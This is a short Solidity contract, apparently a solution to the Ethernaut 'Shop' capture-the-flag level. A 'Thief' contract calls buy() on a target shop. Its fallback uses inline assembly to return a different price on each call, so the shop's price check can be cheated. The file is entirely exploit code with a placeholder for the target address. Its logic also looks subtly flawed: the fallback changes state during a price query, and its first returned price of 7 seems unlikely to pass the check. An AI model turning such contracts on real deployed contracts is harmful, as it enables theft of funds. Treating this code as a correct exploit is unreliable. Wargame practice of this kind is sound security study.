//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Shop {
    function buy() external;
}

contract Thief {
    bool a;

    function steal(address $your_ethernaut_address_here) public {
        Shop shop = Shop($your_ethernaut_address_here);
        shop.buy();
    }

    fallback() external {
        if (!a) {
            a = true;
            assembly {
                let fake := 0x07
                mstore(0x40, fake)
                return(0x40, 0x20)
            }
        }

        if (a) {
            a = false;
            assembly {
                let price := 0x00
                mstore(0x40, price)
                return(0x40, 0x20)
            }
        }
    }
}